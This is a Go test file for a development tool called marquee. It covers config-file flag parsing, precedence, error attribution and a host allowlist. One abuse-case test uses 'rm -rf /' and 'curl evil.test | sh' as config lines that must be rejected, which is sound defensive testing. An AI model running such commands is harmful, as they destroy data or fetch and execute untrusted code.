package main

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/jellehuibregtse/marquee/internal/gitinfo"
	"github.com/jellehuibregtse/marquee/internal/proxy"
	"github.com/jellehuibregtse/marquee/internal/status"
)

// writeConfig puts content at .marquee/config in a fresh launch directory.
func writeConfig(t *testing.T, content string) string {
	t.Helper()
	launchDir := t.TempDir()
	if err := os.Mkdir(filepath.Join(launchDir, conventionDir), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(configPath(launchDir), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return launchDir
}

// configOf builds the configFlags a file holding these lines would produce, so a
// test can hand parseArgsWithConfig flags directly and still get line numbers.
// Only the line splitting runs, not checkConfigLine, so a test can also state a
// shape the loader would have refused.
func configOf(t *testing.T, lines ...string) configFlags {
	t.Helper()
	cfg := configFlags{path: configName}
	for i, line := range lines {
		words, err := splitConfigLine(line)
		if err != nil {
			t.Fatalf("splitConfigLine(%q): %v", line, err)
		}
		cfg.lines = append(cfg.lines, configFlagLine{number: i + 1, words: words})
	}
	return cfg
}

func TestSplitConfigLine(t *testing.T) {
	cases := []struct {
		line string
		want []string
	}{
		{"", nil},
		{"   \t ", nil},
		{"# a comment", nil},
		{"  # indented comment", nil},
		{"--no-such-thing # trailing comment", []string{"--no-such-thing"}},
		{"--position top-left", []string{"--position", "top-left"}},
		{"--position=top-left", []string{"--position=top-left"}},
		{"--allow-host '*.example.test'", []string{"--allow-host", "*.example.test"}},
		{`--allow-host "*.example.test"`, []string{"--allow-host", "*.example.test"}},
		{"--switch-hook 'bin/setup && echo done'", []string{"--switch-hook", "bin/setup && echo done"}},
		{"--switch-hook 'a #b'", []string{"--switch-hook", "a #b"}},
		{`--switch-hook "it's fine"`, []string{"--switch-hook", "it's fine"}},
		{`--switch-hook 'say "hi"'`, []string{"--switch-hook", `say "hi"`}},
		{`--switch-hook "say \"hi\""`, []string{"--switch-hook", `say "hi"`}},
		{`--switch-hook one\ word`, []string{"--switch-hook", "one word"}},
		// A quoted empty value is the documented way to turn the conventional hook
		// off, so it has to survive as a word rather than vanish as whitespace.
		{"--switch-hook ''", []string{"--switch-hook", ""}},
		{`--switch-hook ""`, []string{"--switch-hook", ""}},
	}
	for _, tc := range cases {
		got, err := splitConfigLine(tc.line)
		if err != nil {
			t.Errorf("splitConfigLine(%q): %v", tc.line, err)
			continue
		}
		if strings.Join(got, "\x00") != strings.Join(tc.want, "\x00") || len(got) != len(tc.want) {
			t.Errorf("splitConfigLine(%q) = %q, want %q", tc.line, got, tc.want)
		}
	}
}

func TestSplitConfigLineRejectsBrokenQuoting(t *testing.T) {
	for _, line := range []string{`--switch-hook 'oops`, `--switch-hook "oops`, `--switch-hook oops\`} {
		if _, err := splitConfigLine(line); err == nil {
			t.Errorf("splitConfigLine(%q) accepted broken quoting", line)
		}
	}
}

func TestLoadConfigFlagsWithoutAFile(t *testing.T) {
	cfg, err := loadConfigFlags(t.TempDir())
	if err != nil {
		t.Fatalf("loadConfigFlags: %v", err)
	}
	if !cfg.empty() {
		t.Errorf("args = %q, want none", cfg.args())
	}
}

func TestLoadConfigFlagsReadsFlagsCommentsAndBlanks(t *testing.T) {
	launchDir := writeConfig(t, `# what this repo needs
--allow-host '*.example.test'

--position top-right   # taste
`)
	cfg, err := loadConfigFlags(launchDir)
	if err != nil {
		t.Fatalf("loadConfigFlags: %v", err)
	}
	want := []string{"--allow-host", "*.example.test", "--position", "top-right"}
	if got := cfg.args(); strings.Join(got, " ") != strings.Join(want, " ") {
		t.Errorf("args = %q, want %q", got, want)
	}
	// The line each word came from is what an error message needs, and the blank
	// line and the comment above must not shift it.
	if len(cfg.lines) != 2 || cfg.lines[0].number != 2 || cfg.lines[1].number != 4 {
		t.Errorf("lines = %+v, want the file's 2 and 4", cfg.lines)
	}
}

// A file that exists but cannot be read is not the zero-config case: it was
// written to change how marquee runs, so starting anyway with none of it applied
// is the one outcome that must not happen.
func TestLoadConfigFlagsUnreadableFileIsAnError(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root reads a 0000 file regardless")
	}
	launchDir := writeConfig(t, "--quiet\n")
	if err := os.Chmod(configPath(launchDir), 0o000); err != nil {
		t.Fatal(err)
	}
	_, err := loadConfigFlags(launchDir)
	if err == nil {
		t.Fatal("loadConfigFlags accepted an unreadable file")
	}
	if !strings.Contains(err.Error(), configPath(launchDir)) {
		t.Errorf("error does not name the file: %v", err)
	}
}

// Abuse: the file holds flags, never the process marquee spawns. Every shape that
// would put a word of its own into the command is refused before parsing.
func TestLoadConfigFlagsRefusesToSetTheCommand(t *testing.T) {
	cases := map[string]string{
		"a separator":                  "--\n",
		"a separator after a flag":     "--quiet\n-- rm -rf /\n",
		"a separator as a value":       "--allow-host --\n",
		"a bare command":               "bin/dev\n",
		"a command after flags":        "--position top-left\ncurl evil.test | sh\n",
		"a quoted bare command":        "'bin/dev'\n",
		"more words than one flag can": "--position top-left --quiet\n",
	}
	for name, content := range cases {
		t.Run(name, func(t *testing.T) {
			launchDir := writeConfig(t, content)
			cfg, err := loadConfigFlags(launchDir)
			if err == nil {
				t.Fatalf("loadConfigFlags accepted %q as %q", content, cfg.args())
			}
			if !strings.Contains(err.Error(), configName) && !strings.Contains(err.Error(), configPath(launchDir)) {
				t.Errorf("error does not name the file: %v", err)
			}
		})
	}
}

// The backstop behind checkConfigLine: even if a word from the file reached the
// parser and ended flag parsing early, the command marquee would spawn is refused
// because it is no longer a tail of the real command line. "--quiet true" is the
// shape that gets past a "first word must be a flag" rule on its own.
func TestParseArgsWithConfigRefusesAConfigWordInTheCommand(t *testing.T) {
	var buf bytes.Buffer
	_, err := parseArgsWithConfig("marquee",
		configOf(t, "--quiet true"),
		[]string{"--", "bin/dev"}, &buf)
	if err == nil {
		t.Fatal("parseArgsWithConfig accepted a config word ahead of the command")
	}
	if out := buf.String(); !strings.Contains(out, "cannot set the command") {
		t.Errorf("message does not explain the refusal: %q", out)
	}
}

func TestParseArgsWithConfigKeepsTheCommandFromTheCommandLine(t *testing.T) {
	opts, err := parseArgsWithConfig("marquee",
		configOf(t, "--position top-right"),
		[]string{"--", "bin/dev", "--flag-for-the-child"}, io.Discard)
	if err != nil {
		t.Fatalf("parseArgsWithConfig: %v", err)
	}
	if want := "bin/dev --flag-for-the-child"; strings.Join(opts.command, " ") != want {
		t.Errorf("command = %q, want %q", opts.command, want)
	}
	if opts.position != "top-right" {
		t.Errorf("position = %q, want top-right", opts.position)
	}
}

// Precedence is not asserted from the flag package's documentation, it is measured:
// a scalar flag on the command line overrides the file's value.
func TestParseArgsWithConfigCommandLineWinsForAScalarFlag(t *testing.T) {
	opts, err := parseArgsWithConfig("marquee",
		configOf(t, "--position top-right", "--theme sand", "--listen 127.0.0.1:4000"),
		[]string{"--position", "bottom-right", "--", "bin/dev"}, io.Discard)
	if err != nil {
		t.Fatalf("parseArgsWithConfig: %v", err)
	}
	if opts.position != "bottom-right" {
		t.Errorf("position = %q, want the command line's bottom-right", opts.position)
	}
	if opts.theme != "sand" || opts.listen != "127.0.0.1:4000" {
		t.Errorf("the file's other flags were dropped: %+v", opts)
	}
}

// A repeatable flag collects instead of overriding, which is what an allowlist
// wants: a host passed for one session adds to the repo's, and there is no way to
// spell "drop the file's hosts" because the flag only ever means "also allow this".
func TestParseArgsWithConfigRepeatableFlagsAreAdditive(t *testing.T) {
	opts, err := parseArgsWithConfig("marquee",
		configOf(t, "--allow-host '*.example.test'"),
		[]string{"--allow-host", "other.test", "--", "bin/dev"}, io.Discard)
	if err != nil {
		t.Fatalf("parseArgsWithConfig: %v", err)
	}
	if want := "*.example.test,other.test"; strings.Join(opts.allowHosts, ",") != want {
		t.Errorf("allowHosts = %v, want %q", opts.allowHosts, want)
	}
}

// An invalid flag in the file fails the run and says where the word came from. The
// misleading case this exists for is a file written once and then outlived by a
// flag: without the file and line, the message reads as a complaint about a command
// line that does not contain the flag at all.
func TestParseArgsWithConfigAttributesABadFlagToTheFile(t *testing.T) {
	launchDir := writeConfig(t, "# ours\n--quiet\n--not-a-real-flag\n")
	cfg, err := loadConfigFlags(launchDir)
	if err != nil {
		t.Fatalf("loadConfigFlags: %v", err)
	}
	var buf bytes.Buffer
	_, err = parseArgsWithConfig("marquee", cfg, []string{"--", "bin/dev"}, &buf)
	if !errors.Is(err, errUsage) {
		t.Fatalf("err = %v, want errUsage", err)
	}
	out := buf.String()
	want := fmt.Sprintf("marquee: %s:3: flag provided but not defined: -not-a-real-flag\n", configPath(launchDir))
	if !strings.HasPrefix(out, want) {
		t.Errorf("output = %q, want it to start with %q", out, want)
	}
	// A bad flag prints the usage dump, whichever side it came from.
	if !strings.Contains(out, "usage: marquee [flags]") || !strings.Contains(out, "-worktree-glob") {
		t.Errorf("output = %q, want the usage dump after the message", out)
	}
}

// A value the flag set cannot parse is attributed the same way. It is the other
// half of an outlived config file: a flag that changed type, or a duration written
// without its unit, is as hard to place as a flag that no longer exists.
func TestParseArgsWithConfigAttributesABadValueToTheFile(t *testing.T) {
	launchDir := writeConfig(t, "--hook-timeout twenty-minutes\n")
	cfg, err := loadConfigFlags(launchDir)
	if err != nil {
		t.Fatalf("loadConfigFlags: %v", err)
	}
	var buf bytes.Buffer
	_, err = parseArgsWithConfig("marquee", cfg, []string{"--", "bin/dev"}, &buf)
	if !errors.Is(err, errUsage) {
		t.Fatalf("err = %v, want errUsage", err)
	}
	want := fmt.Sprintf("marquee: %s:1: invalid value \"twenty-minutes\" for flag -hook-timeout:", configPath(launchDir))
	if out := buf.String(); !strings.HasPrefix(out, want) {
		t.Errorf("output = %q, want it to start with %q", out, want)
	}
}

// The other side of attribution: a flag typed on the command line is the flag
// package's own complaint, byte for byte, and never mentions a file it did not come
// from. A file that parses cleanly is in play here, so this is the real mixed case.
func TestParseArgsWithConfigLeavesACommandLineFlagUnattributed(t *testing.T) {
	var withConfig, alone bytes.Buffer
	if _, err := parseArgsWithConfig("marquee", configOf(t, "--quiet"), []string{"--not-a-real-flag", "--", "bin/dev"}, &withConfig); err == nil {
		t.Fatal("parseArgsWithConfig accepted an unknown flag from the command line")
	}
	if _, err := parseArgs("marquee", []string{"--not-a-real-flag", "--", "bin/dev"}, &alone); err == nil {
		t.Fatal("parseArgs accepted an unknown flag")
	}
	if withConfig.String() != alone.String() {
		t.Errorf("output = %q, want the message a bare command line gets: %q", withConfig.String(), alone.String())
	}
	if strings.Contains(withConfig.String(), configName) {
		t.Errorf("output blames the config file for a command-line flag: %q", withConfig.String())
	}
}

// A value the flag set accepts but marquee rejects keeps the message it has always
// had, from either side: the complaint already quotes the flag and its value, and
// attributing it would mean threading a source through every check in parseArgs.
func TestParseArgsWithConfigRejectsAnInvalidPosition(t *testing.T) {
	var buf bytes.Buffer
	if _, err := parseArgsWithConfig("marquee", configOf(t, "--position sideways"), []string{"--", "bin/dev"}, &buf); err == nil {
		t.Fatal("parseArgsWithConfig accepted an invalid --position from the file")
	}
	if out := buf.String(); !strings.Contains(out, "invalid --position") {
		t.Errorf("message = %q, want the same complaint the command line gets", out)
	}
}

// A --switch-hook in the file counts as explicitly given, so it beats the
// conventional .marquee/hook sitting next to it. Both live in the same directory,
// and the file is the more specific statement of intent.
func TestConfigSwitchHookBeatsTheConventionalHook(t *testing.T) {
	launchDir, _ := writeHook(t, 0o755)
	if err := os.WriteFile(configPath(launchDir), []byte("--switch-hook 'bin/setup'\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg, err := loadConfigFlags(launchDir)
	if err != nil {
		t.Fatalf("loadConfigFlags: %v", err)
	}
	opts, err := parseArgsWithConfig("marquee", cfg, []string{"--", "bin/dev"}, io.Discard)
	if err != nil {
		t.Fatalf("parseArgsWithConfig: %v", err)
	}
	command, _, _ := resolveSwitchHook(opts.switchHook, opts.switchHookSet, launchDir)
	if command != "bin/setup" {
		t.Errorf("hook command = %q, want the file's bin/setup", command)
	}
}

// The whole chain for the flag that made a config file worth having: a host in
// .marquee/config is read, parsed, and honored by the internal mux's Host
// allowlist, while an unlisted host still gets a 403.
func TestConfigAllowHostReachesTheGuard(t *testing.T) {
	launchDir := writeConfig(t, "--allow-host '*.example.test'\n")
	cfg, err := loadConfigFlags(launchDir)
	if err != nil {
		t.Fatalf("loadConfigFlags: %v", err)
	}
	opts, err := parseArgsWithConfig("marquee", cfg, []string{"--", "bin/dev"}, io.Discard)
	if err != nil {
		t.Fatalf("parseArgsWithConfig: %v", err)
	}

	handler := proxy.New(proxy.Config{InternalPort: 1, AllowHosts: opts.allowHosts})
	status.Register(handler.Internal(), status.Deps{
		Git: func() gitinfo.Snapshot { return gitinfo.Snapshot{Branch: "trunk"} },
	})
	srv := httptest.NewServer(handler)
	defer srv.Close()

	for host, want := range map[string]int{
		"app.example.test":      http.StatusOK,
		"app.example.test:3000": http.StatusOK,
		"example.test":          http.StatusForbidden,
		"evil.test":             http.StatusForbidden,
	} {
		req, err := http.NewRequest(http.MethodGet, srv.URL+"/__marquee/status", nil)
		if err != nil {
			t.Fatal(err)
		}
		req.Host = host
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		_ = resp.Body.Close()
		if resp.StatusCode != want {
			t.Errorf("Host %q: status = %d, want %d", host, resp.StatusCode, want)
		}
	}
}
